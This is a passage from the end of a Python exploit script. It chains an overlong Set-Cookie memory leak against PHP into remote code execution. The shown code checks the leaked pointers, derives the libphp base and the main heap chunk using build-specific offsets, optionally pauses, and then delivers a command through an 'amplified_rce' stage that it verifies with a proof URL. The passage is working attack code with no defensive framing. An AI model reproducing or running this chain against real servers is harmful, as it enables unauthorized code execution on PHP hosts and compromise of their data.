                      f"[+] dominant={dominant:#x} count={count}")
                print("[+] 2MiB pointer buckets: " + repr([
                    (hex(base), bucket_count)
                    for base, bucket_count in buckets.most_common(8)
                ]))
            print("[+] overlong Set-Cookie disclosure reproduced")
            if args.rce is not None:
                if not pointers:
                    print("[-] cannot run RCE without a module pointer")
                    return 3
                libphp = dominant - args.zval_ptr_dtor_offset
                if count < 100 or libphp & 0x1FFFFF:
                    print("[-] dominant pointer failed the exact-build profile")
                    return 4
                heap = libphp + args.heap_from_lib_delta
                if not buckets.get(heap):
                    print("[-] derived main chunk is absent from leak buckets")
                    return 5
                print(f"[+] derived main_chunk={heap:#x} "
                      f"(libphp+{args.heap_from_lib_delta:#x})")
                sys.stdout.flush()
                if args.pause_before_rce:
                    print(f"[*] pausing {args.pause_before_rce:g}s before RCE",
                          flush=True)
                    time.sleep(args.pause_before_rce)
                time.sleep(0.2)
                proof_url = (DEFAULT_RCE_PROOF_URL
                             if args.rce == DEFAULT_RCE_COMMAND else None)
                rce_verified = amplified_rce(
                    args, heap, libphp, args.rce, proof_url)
                if rce_verified is False:
                    print("[-] composed leak-to-RCE stage failed")
                    return 6
                if rce_verified:
                    print("[+] composed leak-to-RCE chain succeeded")
                else:
                    print("[?] composed leak-to-RCE payload delivered; "
                          "execution unverified")
            return 0
    finally:
        holder_stop.set()
        holder_thread.join(timeout=2)
        for sock in holders:
            try:
                sock.close()
            except OSError:
                pass


if __name__ == "__main__":
    raise SystemExit(main())
